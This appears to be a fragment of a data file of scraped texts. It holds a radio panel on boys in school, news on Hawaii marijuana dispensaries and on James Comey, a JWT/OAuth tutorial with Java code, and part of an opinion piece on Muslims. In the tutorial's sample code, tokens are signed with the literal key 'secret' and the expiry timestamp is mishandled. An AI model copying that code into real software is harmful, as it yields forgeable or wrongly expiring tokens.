enough.\n\nAnd this is a part of the problem that we also need to be attentive to. Boys develop literacy skills at a later stage than many girls do, and so while I think the biases that she's drawing our attention to are important, it's equally important to point out the ways in which masculinity, as we've come to understand it, has also become a problem for many boys in our country.\n\nMARTIN: Dean Pianta, why don't you complicate the issue further too, because your research has shown that teachers' own expectations and beliefs to affect the classroom dynamic. Do you think that this is contributing or how do you think this might contribute to how boys are doing in school?\n\nPIANTA: Sure. Well, you know, I think it should come as no surprise that teachers factor children's behavior into the grades that they assign them and that there is a discrepancy between grades and test scores. You know, the classroom environment, you know, advantages, compliance and performance - those are the kinds of things that are valued there, and a teacher has to manage, you know, 25 or 30 kids. And in that context, particularly with a, you know, increasing pressure on test scores and accountability types of performance of rote and kind of factual skills, these are not particularly interesting environments for a lot of kids, whether they're boys or girls.\n\nNOGUERA: And we also do a fairly poor job of supporting teachers to engage kids effectively in the ways that they interact with them. And so you put that combination of things together - a set of cultural expectations and beliefs about what we value in kids and in schools. We send messages that boys tend to be more aggressive or more active. We make attributions of those behaviors as being problematic in a particular environment and you set this kind of trap for kids whose behavior deviates from, you know, kind of accepted norms of compliance and conformance. And whether they're boys or girls or Latino or black or young or old, they tend to get excluded and dealt with harshly.\n\nMARTIN: Well, Dean, can I just ask you about that, though? If the expectation is that boys are more aggressive why wouldn't there be a bias in favor of their being aggressive? I mean if the expectation of teachers - if you kind of walk in with let's say 2,000 years of social history that tells you that oh, boys are more aggressive, if a boy acts up wouldn't you give, wouldn't you sort of think that a teacher would give the boy more slack, when the research suggests that it's actually going the other way?\n\nPIANTA: No. I think what they do is they, most teachers - and this happens with parents too, you know, we interpret kids' activity as aggression. So a child who behaves toward me as a teacher in a way that might be, you know, somewhat active and one teacher might attribute that to exuberance and interpret it as exuberance and enthusiasm, another one might interpret it as aggression or hyperactivity. And to the degree that those interpretations about aggression and hyperactivity in the context of a really demanding classroom environment are present, then what's likely to happen is a cascade of events that lead to that child being somehow excluded from the resources of the classroom and the teacher. So it's a matter of interpretation of behavior that is generally ambiguous. And when the interpretation heads in a particular direction and it's driven by things like zero tolerance or other kinds of biases that might exist in the system, then we see kids heading in the directions that we see them.\n\nMARTIN: As I mentioned, this is such a complicated topic that we're only going to scratch the surface. So in the time we have left I'd like to talk with each of you about what you think we should do about this? Christina Hoff Sommers, you want to start?\n\nCHRISTINA HOFF SOMMERS: Well, I think we first have to admit that on average girls and boys are different and to pretend that they're identical and to structure the classroom around an ideal child, which for many teachers would be a girl, is going to fail our male students terribly. And there are some wonderful innovations, including single-sex classrooms, trying to get more male teachers and more male mentors in our school, to bring back sort of high-level vocational education where kids get college preparatory courses, but they also can spend half the day preparing for careers. These boys are thriving in schools like Aviation High - and girls are too, but more boys in aviation and technology schools in Massachusetts. This is an excellent model and it's being used throughout Europe and we should be doing that. And ultimately, I think just acknowledging that we are doing a better job educating our daughters than our sons.\n\nMARTIN: Pedro Noguera, what do you think?\n\nNOGUERA: I think that single-sex education is an option that we should make available and that there is some evidence that, in the right settings, that boys can be quite successful when teachers are aware of their biases and allow the classroom to be more interactive and active learning to be a part of the learning experience. I would say girls benefit from that too. And so we should avoid the tendency to think boys and girls are so different that girls benefit from being able to be physically active and develop their voice in the classroom as well.\n\nHowever, boys especially need to develop social and emotional intelligence. They need to learn how to work cooperatively. They need to learn how to listen. They need to know how to develop and articulate themselves. If boys don't develop these skills early, they find that they are at a huge disadvantage.\n\nI would also remind us that boys are much more likely than girls to engage in violence. And that violence as a problem in our society is a male problem. And it concerns me a bit that we frame this as boys as victims and not understand the ways in which masculinity also results in women being victimized and boys victimizing each other. And I think that if we don't understand how masculinity contributes to this problem that we will I think simplify it and just call it a war on boys and not recognize the way in which men perpetuate this problem in many ways.\n\nMARTIN: You know, Glenn Ivey, it's helpful that you're here because you kind of have your fingers in all of these dilemmas as the parent of five boys who are all very different. I mean you have one, you know, one who is very interested in sports and one who is very interested in art and one who is very interested in acting. You've kind of run the gamut of interest with them.\n\nIVEY: Yeah.\n\nMARTIN: And yet, you are a part of the criminal justice system. And so I'm going to ask you just as a former prosecutor to see do you feel that there's kind of a bias built in, or do you agree with Pedro Noguera that really, that we have to train ways to behave differently, we still have a long way to go in training boys and getting them to buy into different behaviors?\n\nIVEY: Well, I think both of those things are right. I agreed with what he said. But also I think, you know, young boys who end up becoming violent frequently, you have sort of two things that are driving it: A, there's violence in the home or they are personally experiencing violence. And so dealing with that piece isn't necessarily simply a school factor but it's something that also needs to be addressed. But also frequently, the kids that are grow up to be adults who are in jail, especially for very serious crimes, if you trace it back, usually they weren't good students, usually they started struggling extremely early in school, have low reading levels, a lot of them have a lot of truancy.\n\nWe had a kid, for example, who killed his mother at age 14. He'd had like 120 truant days in kindergarten. So missing those kinds of flags I think is a big problem and we have to figure out ways to address that early. But I don't think that is, you know, the big group of kids that are coming through and you've got, especially in the African-American community, I think there are challenges with that. But I want to be real careful about suggesting yeah, we've got kids and they fight and that sort of thing. But those aren't the, you know, the majority of them are not growing up and becoming violent criminals. And I want to make sure that they don't think that's the case either because their mindset is critical and what they think they can become is frequently what they become.\n\nMARTIN: Christina Hoff Sommers wants to respond to that briefly...\n\nSOMMERS: I just want to say...\n\nMARTIN: Before I go to Bob Pianta.\n\nSOMMERS: Just quickly, I want to agree with part of what Professor Noguera said. But I don't think we should indict masculinity because sociologists make a critical difference between healthy masculinity and protest masculinity. And boys that are captive to protest masculinity, they are destructive, they prey on weaker people. Healthy masculinity is exactly the opposite. Boys who are in a healthy masculine mode create, they don't destroy, they protect, they don't prey upon and that's what we have to encourage in young men.\n\nMARTIN: Bob Pianta, what do you have to add to this?\n\nPIANTA: Well I - you know, I think what we're seeing is in some sense the kind of squeezing and narrowly of the educational design space over the last 20 years. We don't do a very good job of teaching social and emotional skills to any children. Boys are particularly important in this regard. How we foster their capacity for relationships with others that are effective where they can feel that they're getting their social and emotional needs met, they're mastering needs met. These are things that are just not part of the regular school curriculum anymore.\n\nWe find, and I think this is an example of, you find these examples of success in same school, same-sex education, you find it in good public school classrooms where teachers are effective at engaging kids around their own motivations, the kid's motivations, the kid's capacities, the kid's social skills and drawing them to a different level in the way that they can engage one another and they can engage challenging tasks. And that's the task for us, is to find ways of helping cultivate those kinds of environments on a very, very large level of scale. And it's - to my way of thinking, it's much more of a challenge of the human capital development of the teachers that are in these environments and the other adults that are in schools than it is a problem with boys or black boys, or Latino boys or other kids that we define as kind of outlier groups in some way.\n\nMARTIN: Dean Pianta, do you think that this issue is now being surfaced? I mean as - there's a lot of attention to it in academic circles, and I know a certain amount of parents talk about it. But more broadly...\n\nPIANTA: Oh, I think we hear this in a lot of spaces, not in as widespread a nature as I think we need to. I think as we think about sort of at the larger policy level, as discussions move forward about, for example the, you know, the re-authorization of No Child Left Behind, an important thing to think about is - or pay attention to is the degree to which there is going to be a focus on social, emotional learning and curriculum and standards in what we are going to be looking at from schools from an accountability perspective. Those things send signals.\n\nMARTIN: We only have two minutes left, so I'm going to give the final word to Pedro Noguera and Christina Hoff Sommers because the two of you seem to have kind of the sharpest disagreements. Are you - I want to ask each of you, are you optimistic or pessimistic that both of you have written about this. You come at it, you know, slightly differently, but do you feel at least that we as a country are talking about helping everybody to achieve in a way that is healthy for them and for the country? Pedro Noguera, I'll start with you, and then Christina Hoff Sommers, I'll give you the last word.\n\nNOGUERA: Well, actually I don't think we're that far apart. And I want to just again say I think that's what Christina Sommers is doing in this work is drawing attention to an important issue that has been ignored. I want to echo the point that Bob Pianta just made at the end, which is that we need to get schools much more focused on the developmental needs of children. The last few years we've focused only on achievement, as though test scores really are what determine success in life, completely ignoring the kinds of attributes that our children need to cultivate and the awareness of the developmental needs of our children that teachers need to have in order for our kids to grow and be successful in life. And I think that by understanding how gender plays into academic and life success, that our teachers can become better able to respond the needs of all children, boys and girls.\n\nMARTIN: Christina Hoff Sommers, final thought?\n\nSOMMERS: Yes. Well, I would second that. And I'll just conclude by drawing people's attention to a fantastic program in Chicago called Becoming A Man, The Sports Edition. This is a program, a kind of intervention, for boys so at risk for every negative outcome, and they bring these boys together and they use sports and also they sort of engage them and work with their anger management and they have turned things around for these boys. But they haven't - it's not a discuss your feelings, it's not trying to get them to be exactly like girls, it's treating them as young men and trying to cultivate a mature masculinity.\n\nMARTIN: Well, thank you for all discussing your feelings. We appreciate that.\n\nSOMMERS: Thank you.\n\n(LAUGHTER)\n\nIVEY: Thank you, Michel.\n\nMARTIN: Christina Hoff Sommers is author of the book \"The War Against Boys,\" and a recent opinion piece in The New York Times. Glenn Ivey is an attorney in private practice, the father of six, including five boys. Bob Pianta is a father of three, dean of the Curry School of Education at the University of Virginia. And Pedro Noguera is an education professor at the New York University, and he was with us from member station WLRN in Miami.\n\nThank you all so much for joining us.\n\nSOMMERS: Thank you very much.\n\nIVEY: Thank you.\n\n(SOUNDBITE OF MUSIC)\n\nMARTIN: And that's our program for today.

  "latent_21859": "Members of the Hawaii Legislature approved a bill Thursday that would establish a system of medical marijuana dispensaries statewide by next summer.\n\nHawaii legalized medical marijuana 15 years ago, but has never provided a way to buy it legally. Patients must grow their own or have a caretaker grow it for them.\n\nHouse Bill 321 would allow eight companies to open two marijuana dispensaries each as soon as July 15, 2016.\n\nThe bill passed the Senate unanimously with Sen. Russell Ruderman excused. House lawmakers approved the bill 38-13 after more than a half-hour of discussion. The measure goes next to Gov. David Ige, who has indicated he supports the medical marijuana dispensaries.\n\nCory Lum/Civil Beat\n\nThe Legislature adjourned Thursday and doesn’t plan to resume until next January. While lawmakers passed a range of bills this year, including a 100 percent renewable energy goal for the state and a bill that would allow a tax extension to fund Honolulu rail, legislative leaders cited establishing medical marijuana dispensaries as one of their biggest accomplishments.\n\nThe measure had apparently died Friday after Rep. Della Au Belatti and Sen.

  "latent_22059": "Looking for news you can trust?\n\nSubscribe to our free newsletters.\n\nThe pending nomination of James Comey to become FBI chief is a poke in the eye with a very sharp stick for the Cheney crowd. Comey, deputy attorney general during the W. years, has drawn criticism from civil libertarians for being part of an administration that waterboarded (though Comey reportedly opposed the justification of this practice), yet Comey is best known for saying no to a top-secret surveillance program much beloved by Vice President Dick Cheney and his lieutenants. He successfully defied the Bush-Cheney White House on this point in a dramatic encounter in a Washington hospital room, when top Bush advisers tried to bum-rush an ailing Attorney General John Ashcroft into authorizing an extension of the program after Comey, then the acting attorney general, had refused. But Cheney and his crew have another good reason to be aghast at the thought of Comey leading the FBI: he was the guy who started the independent Plamegate investigation that ended up tainting Cheney and convicting Scooter Libby, Cheney’s chief of staff, of serious crimes.\n\nThis affair began in the summer of 2003. It was months after Bush and Cheney had launched the invasion of Iraq. No weapons of mass destruction—the central selling point for the war—had been found. And former Ambassador Joseph Wilson wrote a New York Times op-ed that disclosed he had been sent by the CIA to Niger in 2002 to check out a secret report that Saddam Hussein had tried to procure uranium there supposedly for use in a nuclear weapon program. (Cheney had asked the CIA to investigate this allegation.) In his article, Wilson noted that he had reported back to the CIA that there was little reason to accept this sketchy report of Iraqi uranium shopping.\n\nWith this op-ed, Wilson supercharged the ongoing controversy over whether the Bush-Cheney White House had purposefully misled the nation into war. Immediately, Wilson became a target for furious White House aides—particularly those in Cheney’s shop—and their allies, who mounted a fierce campaign to discredit him. In the ensuing dust-up, conservative columnist Robert Novak reported that Wilson’s wife, Valerie Plame, was a CIA officer, thus blowing her cover. (She had been an covert officer who managed operations aimed at gathering intelligence on Iraq’s weapons programs.)\n\nIt is a federal crime for a government official to knowingly reveal the identity of a clandestine officer. Novak’s two sources, we now know, were Richard Armitage, a senior State Department official then, and Karl Rove, Bush’s top White House adviser. But this was not public information at the time, and a few months after the Plame leak, the Justice Department, acting at the request of CIA chief George Tenet, began an investigation of the leak.\n\nEnter James Comey.\n\nAs Michael Isikoff and I reported in our book, Hubris: The Inside Story of Spin, Scandal, and the Selling of the Iraq War, the ongoing Plamegate investigation was a hot topic in October 2003 when Comey, whom Bush had nominated to be deputy attorney general, appeared on Capitol Hill for his confirmation hearing. At this point, Democrats were demanding a special prosecutor for the case, noting that because the trail possibly led to the White House, Ashcroft could not be trusted to conduct an independent investigation.\n\nDuring the hearing, Sen. Chuck Schumer (D-N.Y.), held up a chart entitled “A Tangled Web…?” that showed the various connections between Ashcroft and White House officials, including Rove. Schumer, who had helped Comey become US attorney in New York two years earlier, pressed Comey on whether he would support the appointment of a special counsel in the leak case. Comey wouldn’t comment on the particulars of the case or make a commitment. But he did say he believed in erring “on the side of caution” on ethics issues. “I don’t care about politics,” he noted. “I don’t care about expediency. I don’t care about friendship. I care about doing the right thing.”\n\nComey was confirmed in early December. Schumer called with congratulations and told him that he had a month. That is, a month to do the right thing on the CIA leak case.\n\nSo began the investigative activity that would lead to the trial and conviction of Scooter Libby for lying to FBI agents and the grand jury.\n\nComey took less than a month. It turned out that Ashcroft and his aides were not eager to have Ashcroft retain authority for the leak investigation. It was bad politics and could harm Aschforft’s own political standing—and he still dreamed of running for office again. Comey discussed the case with Ashcroft, and on December 30, 2003, he called a surprise press conference to announce that in “an abundance of caution,” Ashcroft and he had decided that the attorney general and his entire personal staff should recuse themselves. And there was more news: Comey was turning over the case to his close friend Patrick Fitzgerald, the US attorney in Chicago. Fitzgerald would assume control as a special counsel. This meant that Fitzgerald would not have report to Comey or anyone else at Justice about this inquiry. Comey was granting Fitzgerald tremendous powers held by no other federal prosecutor in the nation. Even independent counsels of the past, such as Kenneth Starr, had at least been accountable to a three-judge panel that oversaw their work. Fitzgerald would be answerable to no one.\n\nComey and Fitzgerald had years earlier worked on cases together at the US attorney’s office in New York, and Comey noted that Fitzgerald had a “sterling reputation” and was “absolutely apolitical.” Fitzgerald was, Comey remarked, “Eliot Ness with a Harvard law degree and a sense of humor.”\n\nFitzgerald wasted no time. That day, he met with the lead FBI agent on the case and began plowing through a thick binder filled with 40 dense FBI reports that summarized the interviews the FBI had already conducted for the leak case. By New Year’s Day—two days later—Fitzgerald had read them all and had plenty of ideas about aggressively moving the case forward. Soon after, Fitzgerald expanded the scope of the investigation beyond determining who had leaked the information and whether the leak was a violation of law. He got Comey to write him a letter (which wasn’t made public at the time) noting that Fitzgerald had the authority to investigate not just underlying crimes connected to the leak but perjury, obstruction of justice, the destruction of evidence, and related crimes. Then Fitzgerald started hauling top White House officials before a grand jury.\n\nSo began the investigative activity that would lead to the trial and conviction of Scooter Libby for lying to FBI agents and the grand jury. (Bush would commute Libby’s sentence but not pardon him—a decision that deepened the rift between Bush and Cheney at the end of their White House days.) The high-profile Libby trial showed that Cheney had been driving the get-Wilson crusade and had early on learned about Valerie Wilson’s CIA employment and conveyed that information to Libby (who subsequently shared it with reporters). Fitzgerald’s investigation showed that in the CIA leak affair, Cheney and his aides put politics (discrediting Joe Wilson) ahead of national security concerns (protecting the identity and operations of a CIA officer working the WMD beat).\n\nComey, in a way, sicced Fitzgerald on the Cheney gang—and allowed Fitzgerald to target Libby for trying to cover up for Cheney. And thanks to Fitzgerald’s unrelenting efforts, the public saw that the Bush White House was not honest—the administration had insisted Rove was not involved in the leak—and that top Bush officials, including the vice president, had risked national security for partisan gain. (Fitzgerald, coincidentally, was on Obama’s short list for FBI director.) Comey’s role in the CIA leak story may or may not be a qualification for FBI chief. But it does show how government can work when top law enforcement officials play it straight.\n\nPortions of this article were drawn from Hubris: The Inside Story of Spin, Scandal, and the Selling of the Iraq War, by Michael Isikoff and David Corn.",
  "latent_22156": "New to token authentication, OAuth, or JSON Web Tokens? This is a great place to start!\n\nFirst, what is a JSON Web Token, or JWT (pronounced “jot”)? In a nutshell, a JWT is a secure and trustworthy standard for token authentication. JWTs allow you to digitally sign information (referred to as claims) with a signature and can be verified at a later time with a secret signing key.\n\nWhat is Token Authentication?\n\nThe process by which an application confirms user identity is called authentication. Traditionally, applications have persisted identity through session cookies which rely on session IDs stored server-side. In this structure, developers are forced to create session storage that is either unique and server-specific, or implemented as a completely separate session storage layer.\n\nToken authentication is a more modern approach, designed solve problems server-side session IDs can’t. Using tokens in place of session IDs can lower your server load, streamline permission management, and provide better tools for supporting a distributed or cloud-based infrastructure. In this method, tokens are generated for your users after they present verifiable credentials. The initial authentication could be by username/password credentials, API keys or even tokens from another service. (Stormpath’s API Key Authentication Feature is an example of this.)\n\nInterested in learning more? Check out this blog post on scaling user management with tokens, or our complete product documentation.\n\nAnatomy of a JWT\n\nIf you encounter a JWT in the wild, you’ll notice that it’s separated into three sections, the header, payload, and signature. (Follow along with Stormpath’s open-source Java JWT tool as we dissect the anatomy of a JWT!) Here’s an example of a typical JWT:\n\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiJ1c2Vycy9Uek1Vb2NNRjRwIiwibmFtZSI6IlJvYmVydCBUb2tlbiBNYW4iLCJzY29wZSI6InNlbGYgZ3JvdXBzL2FkbWlucyIsImV4cCI6IjEzMDA4MTkzODAifQ . 1pVOLQduFWW3muii1LExVBt2TK1-MdRI4QjhKryaDwc 1 2 3 4 5 6 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiJ1c2Vycy9Uek1Vb2NNRjRwIiwibmFtZSI6IlJvYmVydCBUb2tlbiBNYW4iLCJzY29wZSI6InNlbGYgZ3JvdXBzL2FkbWlucyIsImV4cCI6IjEzMDA4MTkzODAifQ . 1pVOLQduFWW3muii1LExVBt2TK1 - MdRI4QjhKryaDwc\n\nIn this example, Section 1 is a header which describes the token. Section 2 is the payload, which contains the JWT’s claims, and Section 3 is the signature hash that can be used to verify the integrity of the token (if you have the secret key that was used to sign it).\n\nWhen we decode the payload we get this nice, tidy JSON object containing the claims of the JWS:\n\n{ \"sub\": \"users/TzMUocMF4p\", \"name\": \"Robert Token Man\", \"scope\": \"self groups/admins\", \"exp\": \"1300819380\" } 1 2 3 4 5 6 7 { \"sub\" : \"users/TzMUocMF4p\" , \"name\" : \"Robert Token Man\" , \"scope\" : \"self groups/admins\" , \"exp\" : \"1300819380\" }\n\nThe claims tell you, at minimum:\n\nWho this person is and the URI to their user resource (the sub claim)\n\nWhat this person can access with this token (the scope claim)\n\nWhen the token expires. Your API should be using this when it verifies the token.\n\nBecause the token is signed with a secret key you can verify its signature and implicitly trust what is being claimed.\n\nJWE, JWS, and JWT\n\nPer the JWT Spec, “JWTs represent a set of claims as a JSON object that is encoded in a JWS and/or JWE structure.” The term “JWT” technically only describes an unsigned token; what we refer to as a JWT is most often a JWS or JWS + JWE.\n\nJWS — JSON Web Signature\n\nIn the JWS scheme, the server signs the JWT and transmits it to the client with the signature. The signature provides a guarantee that the JWT claims have not been forged or tampered with. However, the JWT is not encrypted (the contents are essentially plaintext).\n\nJWE — JSON Web Encryption\n\nThe JWE scheme, on the other hand, encrypts the contents without signing it. This brings confidentiality to your JWT, but not the security of signing and enclosing the JWE inside a JWS.\n\nWhat the Heck is OAuth?\n\nOAuth 2.0 is a framework for interaction with a service that can delegate authentication or provide authorization. It is widely adopted across many mobile and web applications. OAuth 2.0 does not specify a token format, but JWT is rapidly becoming a defacto standard in the industry.\n\nWithin the OAuth paradigm, there are two token types: Access and Refresh Tokens. When you first authenticate, your application (and thus your user), is typically given both tokens, but the Access Token is set to expire after a short period (this duration is configurable in the application). Once the initial Access Token has expired, the Refresh Token will allow your application to obtain a new Access Token. Refresh Tokens have a set expiration, allowing for unlimited use up until that expiration point is reached. Both Access and Refresh Tokens have built-in security (when signed) to prevent tampering and are only valid for a specific duration.\n\nStormpath uses OAuth because it is an industry standard that can be leveraged by any compliant library. Stormpath currently supports three of OAuth’s grant types:\n\nPassword Grant Type: Provides the ability to get an Access Token based on a username and password\n\nRefresh Grant Type: Provides the ability to generate another Access Token based on a special Refresh Token\n\nClient Credentials Grant Type: Provides the ability to exchange an API Key Pair for an Access Token. This is supported through the API Key Management feature\n\nCreating and Validating JWTs in Java\n\nSo, you’re sold on tokens, now, how do you use them in your application?\n\nWell, if you’re a Java developer you should start with JJWT. JJWT is a Java library providing end-to-end JSON Web Token creation and verification, developed by our very own Les Hazlewood and maintained by a community of developers. Forever free and open-source (Apache License, Version 2.0), it was designed with a builder-focused interface hiding most of its complexity.\n\nCreating\n\nBecause of JJWT’s fluent interface, the creation of the JWT is basically a three-step process:\n\nThe definition of the internal claims of the token, like Issuer, Subject, Expiration, and ID. The cryptographic signing the JWT (making is a JWS) The compaction of the JWT to a URL-safe string, according to the JWT Compact Serialization rules\n\nThe final JWT will be a three-part Base64 encoded string signed with the specified signature algorithm using the provided key. After this point, the token is ready to be shared with the other party.\n\nHere’s an example of creating the JWT from above using the JJWT library:\n\nString jwt = Jwts.builder() .setSubject(\"users/TzMUocMF4p\") .setExpiration(new Date(1300819380)) .claim(\"name\", \"Robert Token Man\") .claim(\"scope\", \"self groups/admins\") .signWith( SignatureAlgorithm.HS256, \"secret\".getBytes(\"UTF-8\") ) .compact(); 1 2 3 4 5 6 7 8 9 10 11 String jwt = Jwts . builder ( ) . setSubject ( \"users/TzMUocMF4p\" ) . setExpiration ( new Date ( 1300819380 ) ) . claim ( \"name\" , \"Robert Token Man\" ) . claim ( \"scope\" , \"self groups/admins\" ) . signWith ( SignatureAlgorithm . HS256 , \"secret\" . getBytes ( \"UTF-8\" ) ) . compact ( ) ;\n\nValidating\n\nOnce you have a JWT, you typically deliver it back to the client that requested it. The client then stores it and passes the Token in requests to your application. This is usually done with either a cookie value or an authorization header in HTTP. For example:\n\nHTTP/1.1 GET /secure-resource Host: https://yourapplication.com Authorization: Bearer eyJraWQiOiIzMUUzRDZaM0xaMVdFSEJGWVRQRksxRzY4IiwiYWxnIjoiSFMyNTYifQ.eyJqdGkiOiI2a3NjVFMyUjZuYlU3c1RhZ0h0aWFXIiwiaWF0IjoxNDQ1ODU0Njk0LCJpc3MiOiJodHRwczovL2FwaS5zdG9ybXBhdGguY29tL3YxL2FwcGxpY2F0aW9ucy8zUUlNbEpLS04yd2hHQ1l6WFh3MXQ4Iiwic3ViIjoiaHR0cHM6Ly9hcGkuc3Rvcm1wYXRoLmNvbS92MS9hY2NvdW50cy8xeG15U0dLMXB5VVc1c25qOENvcmU1IiwiZXhwIjoxNDQ1ODU4Mjk0LCJydGkiOiI2a3NjVE9pTUNESVZWM05qVTIyUnlTIn0.VJyMOicMOdcOCtytsx4hoPHy3Hl3AfGNfi2ydy8AmG4 1 2 3 4 5 6 7 8 HTTP / 1.1 GET / secure - resource Host : https : //yourapplication.com Authorization : Bearer eyJraWQiOiIzMUUzRDZaM0xaMVdFSEJGWVRQRksxRzY4IiwiYWxnIjoiSFMyNTYifQ . eyJqdGkiOiI2a3NjVFMyUjZuYlU3c1RhZ0h0aWFXIiwiaWF0IjoxNDQ1ODU0Njk0LCJpc3MiOiJodHRwczovL2FwaS5zdG9ybXBhdGguY29tL3YxL2FwcGxpY2F0aW9ucy8zUUlNbEpLS04yd2hHQ1l6WFh3MXQ4Iiwic3ViIjoiaHR0cHM6Ly9hcGkuc3Rvcm1wYXRoLmNvbS92MS9hY2NvdW50cy8xeG15U0dLMXB5VVc1c25qOENvcmU1IiwiZXhwIjoxNDQ1ODU4Mjk0LCJydGkiOiI2a3NjVE9pTUNESVZWM05qVTIyUnlTIn0 . VJyMOicMOdcOCtytsx4hoPHy3Hl3AfGNfi2ydy8AmG4\n\nValidating the JWT allows you to verify its authenticity (by checking its digital signature you can check that it is not expired and verify that it hasn’t been tampered with) and get information about the user sending the token.\n\nHere’s an example of validating the JWT that we created above:\n\nString jwt = <jwt passed in from above> Jws<Claims> claims = Jwts.parser() .setSigningKey(\"secret\".getBytes(\"UTF-8\")) .parseClaimsJws(jwt) String scope = claims.getBody().get(\"scope\") assertEquals(scope, \"self groups/admins\"); 1 2 3 4 5 6 7 String jwt = < jwt passed in from above > Jws < Claims > claims = Jwts . parser ( ) . setSigningKey ( \"secret\" . getBytes ( \"UTF-8\" ) ) . parseClaimsJws ( jwt ) String scope = claims . getBody ( ) . get ( \"scope\" ) assertEquals ( scope , \"self groups/admins\" ) ;\n\nIf the signature is incorrect, the call to parseClaimsJws will throw a SignatureException . Once successfully parsed, individual claims can be obtained and checked as in: String scope = claims.getBody().get(\"scope\") .\n\nExceptions\n\nJJWT carries out a variety of validations while working with the JWT. All JJWT-related exceptions are RuntimeExceptions , with JwtException as the base class.\n\nThese errors cause specific exceptions to be thrown:\n\nClaimJwtException : thrown after a validation of a JWT claim failed\n\n: thrown after a validation of a JWT claim failed ExpiredJwtException : indicating that a JWT was accepted after it expired and must be rejected\n\n: indicating that a JWT was accepted after it expired and must be rejected MalformedJwtException : thrown when a JWT was not correctly constructed and should be rejected\n\n: thrown when a JWT was not correctly constructed and should be rejected PrematureJwtException : indicates that a JWT was accepted before it is allowed to be accessed and must be rejected\n\n: indicates that a JWT was accepted before it is allowed to be accessed and must be rejected SignatureException : indicates that either calculating a signature or verifying an existing signature of a JWT failed\n\n: indicates that either calculating a signature or verifying an existing signature of a JWT failed UnsupportedJwtException : thrown when receiving a JWT in a particular format/configuration that does not match the format expected by the application. For example, this exception would be thrown if parsing an unsigned plaintext JWT when the application requires a cryptographically signed Claims JWS instead\n\nThere are a number of other Exception classes that JJWT uses. They all can be found in the io.jsonwebtoken package in the JJWT source.\n\nAre Tokens Secure?\n\nThe real question here is, are you using them securely? At Stormpath, we follow these best practices, and encourage our clients to do the same:\n\nStore your JWTs in secure, HttpOnly cookies. This prevents Cross-Site Scripting (XSS) attacks.\n\nIf you’re using cookies to transmit your JWTs, CSRF protection is super duper important! Your cookies can be used maliciously by other domains that make requests to your website without your user’s consent. If your server blindly authenticates a user, simply because they have a cookie, then you’ve got more problems than your hard drive size. You’re also allowing CSRF attacks, where other websites trigger state-changing actions on your server without your users’ consent. This is possible because the browser will always send the user’s cookies automatically, regardless of how the request was triggered. Use one of the many CSRF Prevention measures to reduce this risk.\n\nSign your tokens with a strong key that is available ONLY to the authentication service. Every time you use a token to authenticate a user, your server MUST verify that the token was signed with your secret key.\n\nDo not store any sensitive data in a JWT. These tokens are usually signed to protect against manipulation (not encrypted) so the data in the claims can be easily decoded and read. Encrypt your tokens if you have to put sensitive, non-opaque information in them. The secret signing key should only be accessible by the issuer and the consumer; it should not be accessible outside of these two parties.\n\nIf you are worried about replay attacks, include a nonce (jti claim), expiration time (exp claim), and creation time (iat claim) in the claims. These are well defined in the JWT Spec.\n\nJJWT, JSONWebToken.io, and JWT Inspector\n\nStormpath supports the development of several JWT-related, open-source developer tools, including:\n\nJJWT\n\nJJWT is an easy to use tool for developers to create and verify JWTs in Java. ike many libraries Stormpath supports, JJWT is completely free and open source (Apache License, Version 2.0), so everyone can see what it does and how it does it. Do not hesitate to report any issues, suggest improvements, and even submit some code!\n\nJSONwebtoken.io is a developer tool we created to make it easy to decode JWTs. Simple paste an existing JWT into the appropriate field to decode its header, payload, and signature. JSONWebToken.io is powered by nJWT, the cleanest free and open source (Apache License, Version 2.0) JWT library for Node.js developers.\n\nJWT Inspector\n\nThe new kid on the block, JWT Inspector is an open source Chrome extension that allows developers to inspect and debug JWTs directly in-browser. The JWT Inspector will discover JWTs on your site (in cookies, local/session storage, and headers) and make them easily accessible through your navigation bar and DevTools panel.\n\nLooking to learn more about JWTs, token authentication, or user identity management?

  "latent_22236": "Terrorists aren't models for Islamic piety\n\nUpdated\n\nHow many times must Muslim \"moderates\" distance themselves from the atrocities of people who call themselves Islamic but who so often demonstrate a feeble understanding of the faith? Sarah Malik writes.\n\nThe recent terror raids in which 800 police officers were needed to charge four men was reminiscent of an episode of Homeland, while our political leaders appear to be enthusiastically beating the drums of war with rhetoric that will only inflame community tensions.\n\nAnd it hasn't taken Jacqui Lambie long to jump on the hysteria bandwagon.\n\nSenator Lambie's nonsensical outburst equating sharia law - a set of ever-evolving legal precepts by which Muslims live - with terrorism was staggering in its ignorance, as was her assertion that those who get \"mixed up\" in it should \"pack their bags and get out of the country\".\n\nFor most Muslims - especially Muslim migrants in the West who sought to escape the legal dysfunction of their home countries - sharia is about the religious rituals that regulate personal matters like fasting, charity, praying, finance and family life.\n\nThis understanding of sharia is a far cry from the gruesome images that have recently dominated headlines.\n\nBy equating Muslim practice with terrorism, Lambie casts suspicion on the vast majority of ordinary, law-abiding Muslims. In fact, UK Huffington Post political director Mehdi Hasan cites research suggesting a proper understanding of sharia could actually work to combat radicalism. Hasan notes that wannabe jihadists are rarely motivated by religious fervour, and in fact tend to live unIslamic lifestyles:\n\nCan you guess which books the wannabe jihadists Yusuf Sarwar and Mohammed Ahmed ordered online from Amazon before they set out from Birmingham to fight in Syria last May? Islam for Dummies and The Koran for Dummies. You could not ask for better evidence to bolster the argument that the 1,400-year-old Islamic faith has little to do with the modern jihadist movement ... instead they (experts) point to other drivers of radicalisation: moral outrage, disaffection, peer pressure, the search for a new identity, for a sense of belonging and purpose.\n\nOne of the Sydney men in custody, Omarjan Azari, allegedly conspired with Kings Cross nightclub bouncer Mohammad Baryalei (who had appeared as an actor in Underbelly: The Golden Mile) to commit random public beheadings. They are hardly models for Islamic piety.\n\nThis doesn't matter to Lambie. In the world according to Lambie, it's not enough to reject extremism - the only way for Muslims to show their allegiance is to reject their adherence to sharia practices altogether. It furthers the feeling among Muslims that no condemnation, no disavowal, no distancing will ever be enough.\n\nMuslims are obligated to apologise for every atrocity committed anywhere on Earth by anyone who calls themselves Muslim, in a way that is not expected of any other group. There is that constant refrain, \"When will the moderates stand up?\"\n\nEvery mainstream Islamic organisation in Australia and around the world has sent out press releases condemning the wanton killing of civilians. The efforts of Muslim communities to create bridges are tireless, from Twitter campaigns like #notinmyname, to UK Imams against ISIS, but they rarely make headlines.\n\nThis is the moment our leaders need to step up, to use the language of inclusion to get minority communities on board and to reassure them of their place in Australia. But instead we have had gung-ho Captain Tony with his own version of \"with us or against us\".\n\nWe are told that no dissenters will be tolerated in the creepy cult-sounding 